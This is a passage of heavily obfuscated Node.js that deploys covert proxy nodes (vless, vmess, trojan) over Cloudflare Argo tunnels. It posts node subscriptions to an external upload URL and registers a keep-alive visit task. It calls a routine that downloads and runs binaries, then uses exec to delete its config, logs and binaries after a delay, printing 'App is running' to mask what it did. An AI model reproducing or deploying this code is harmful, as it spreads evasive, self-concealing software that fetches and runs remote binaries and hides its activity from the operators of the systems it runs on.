axios['get']('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x1e47dd[_0x6dc81f(0x240)]&&_0x1e47dd['data'][_0x6dc81f(_0x3e06c5._0x5abf12)]===_0x6dc81f(_0x3e06c5._0x408201)&&_0x1e47dd[_0x6dc81f(0x240)][_0x6dc81f(_0x3e06c5._0x31b61a)]&&_0x1e47dd[_0x6dc81f(_0x3e06c5._0x5be719)][_0x6dc81f(_0x3e06c5._0x3789f0)])return _0x1e47dd[_0x6dc81f(0x240)][_0x6dc81f(0x219)]+'_'+_0x1e47dd['data'][_0x6dc81f(_0x3e06c5._0x3789f0)];}catch(_0xdca2f8){}}return _0x6dc81f(_0x3e06c5._0x3e308c);}async function _0x263851(_0x22d9cf){const _0xe2402=await _0x3ec51d(),_0x12a2d9=NAME?NAME+'-'+_0xe2402:_0xe2402;return new Promise(_0x10a995=>{const _0x24c07e={_0x15a378:0x1b1,_0x50d065:0x1a4,_0x3bb625:0x1a3,_0x91c90d:0x1d4,_0x366ee2:0x1de,_0x4e25ec:0x190,_0x13c301:0x1bd,_0x1fdff9:0x1e8,_0x5adbdc:0x1bd,_0x5360d1:0x1e9,_0x781915:0x190},_0x3757c5={_0x1c6206:0x1e9,_0xe6f6c8:0x1da};setTimeout(()=>{const _0x45666c=_0x1268,_0x5e9a9b={'v':'2','ps':''+_0x12a2d9,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x22d9cf,'path':_0x45666c(0x23d),'tls':_0x45666c(_0x24c07e._0x15a378),'sni':_0x22d9cf,'alpn':'','fp':'firefox'},_0x46540d=_0x45666c(_0x24c07e._0x50d065)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x22d9cf+_0x45666c(_0x24c07e._0x3bb625)+_0x22d9cf+_0x45666c(0x1c6)+_0x12a2d9+_0x45666c(0x212)+Buffer['from'](JSON[_0x45666c(0x1aa)](_0x5e9a9b))['toString'](_0x45666c(0x1e9))+_0x45666c(_0x24c07e._0x91c90d)+UUID+'@'+CFIP+':'+CFPORT+_0x45666c(0x1f3)+_0x22d9cf+'&fp=firefox&type=ws&host='+_0x22d9cf+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x12a2d9+_0x45666c(_0x24c07e._0x366ee2);console[_0x45666c(_0x24c07e._0x4e25ec)](Buffer[_0x45666c(_0x24c07e._0x13c301)](_0x46540d)[_0x45666c(_0x24c07e._0x1fdff9)](_0x45666c(0x1e9))),fs[_0x45666c(0x1e0)](subPath,Buffer[_0x45666c(_0x24c07e._0x5adbdc)](_0x46540d)['toString'](_0x45666c(_0x24c07e._0x5360d1))),console[_0x45666c(_0x24c07e._0x781915)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x45666c(0x215)]('/'+SUB_PATH,(_0x31bfb4,_0x45f3e6)=>{const _0x47c707=_0x45666c,_0x5bbf95=Buffer[_0x47c707(0x1bd)](_0x46540d)['toString'](_0x47c707(_0x3757c5._0x1c6206));_0x45f3e6[_0x47c707(0x1d3)](_0x47c707(_0x3757c5._0xe6f6c8),'text/plain;\x20charset=utf-8'),_0x45f3e6[_0x47c707(0x1ba)](_0x5bbf95);}),_0x10a995(_0x46540d);},0x7d0);});}}async function uploadNodes(){const _0x301e7a={_0xe72cfe:0x1ee,_0x34a1a4:0x186,_0x342edb:0x190,_0x5d5e0c:0x18d,_0x324e97:0x23b,_0x5067dd:0x1aa,_0xd15a7f:0x186,_0x5c42aa:0x200},_0x203f3d=_0x36d523;if(UPLOAD_URL&&PROJECT_URL){const _0x5a28ff=PROJECT_URL+'/'+SUB_PATH,_0x5676a6={'subscription':[_0x5a28ff]};try{const _0x1b535a=await axios[_0x203f3d(_0x301e7a._0xe72cfe)](UPLOAD_URL+_0x203f3d(0x197),_0x5676a6,{'headers':{'Content-Type':_0x203f3d(0x1bc)}});return _0x1b535a&&_0x1b535a[_0x203f3d(_0x301e7a._0x34a1a4)]===0xc8?(console[_0x203f3d(_0x301e7a._0x342edb)]('Subscription\x20uploaded\x20successfully'),_0x1b535a):null;}catch(_0x2463ec){if(_0x2463ec[_0x203f3d(0x1c9)]){if(_0x2463ec[_0x203f3d(0x1c9)][_0x203f3d(0x186)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x203f3d(_0x301e7a._0x5d5e0c)](listPath))return;const _0x383236=fs[_0x203f3d(0x203)](listPath,'utf-8'),_0x119776=_0x383236['split']('\x0a')['filter'](_0x3dcd33=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x203f3d(0x193)](_0x3dcd33));if(_0x119776[_0x203f3d(_0x301e7a._0x324e97)]===0x0)return;const _0x157f11=JSON[_0x203f3d(_0x301e7a._0x5067dd)]({'nodes':_0x119776});try{const _0x4d67ea=await axios[_0x203f3d(0x1ee)](UPLOAD_URL+_0x203f3d(0x22e),_0x157f11,{'headers':{'Content-Type':'application/json'}});return _0x4d67ea&&_0x4d67ea[_0x203f3d(_0x301e7a._0xd15a7f)]===0xc8?(console['log'](_0x203f3d(_0x301e7a._0x5c42aa)),_0x4d67ea):null;}catch(_0xda1c07){return null;}}else return;}}function cleanFiles(){const _0x5bd285={_0x63d645:0x1fe,_0x52e8fa:0x1db};setTimeout(()=>{const _0x34395c=_0x1268,_0x23f225=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x23f225[_0x34395c(_0x5bd285._0x63d645)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x23f225['push'](phpPath);process['platform']==='win32'?exec(_0x34395c(0x1ea)+_0x23f225['join']('\x20')+_0x34395c(0x20d),_0x74b942=>{const _0x9f5241=_0x34395c;console[_0x9f5241(0x1b6)](),console[_0x9f5241(0x190)]('App\x20is\x20running'),console['log'](_0x9f5241(0x1f0));}):exec(_0x34395c(_0x5bd285._0x52e8fa)+_0x23f225['join']('\x20')+'\x20>/dev/null\x202>&1',_0x4319fa=>{const _0x5b94d7=_0x34395c;console[_0x5b94d7(0x1b6)](),console['log'](_0x5b94d7(0x1df)),console['log'](_0x5b94d7(0x1f0));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1e028e={_0xc016b:0x1ee,_0x36fe47:0x1bc,_0x4e47df:0x1f2},_0x193c08=_0x36d523;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x193c08(0x209));return;}try{const _0x116840=await axios[_0x193c08(_0x1e028e._0xc016b)](_0x193c08(0x1c0),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x193c08(_0x1e028e._0x36fe47)}});return console[_0x193c08(0x190)]('automatic\x20access\x20task\x20added\x20successfully'),_0x116840;}catch(_0x1308fd){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x1308fd[_0x193c08(_0x1e028e._0x4e47df)]),null;}}async function startserver(){const _0x2e023e={_0x29ac74:0x213,_0xe46282:0x21a},_0x34eced=_0x36d523;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x543bc6){console[_0x34eced(_0x2e023e._0x29ac74)](_0x34eced(_0x2e023e._0xe46282),_0x543bc6);}}startserver()[_0x36d523(0x19c)](_0x407d8a=>{const _0x4ef9bb={_0x5f224f:0x213,_0x5483f3:0x1b8},_0x4f256f=_0x36d523;console[_0x4f256f(_0x4ef9bb._0x5f224f)](_0x4f256f(_0x4ef9bb._0x5483f3),_0x407d8a);}),app[_0x36d523(0x214)](PORT,()=>console[_0x36d523(0x190)](_0x36d523(0x1b9)+PORT+'!'));
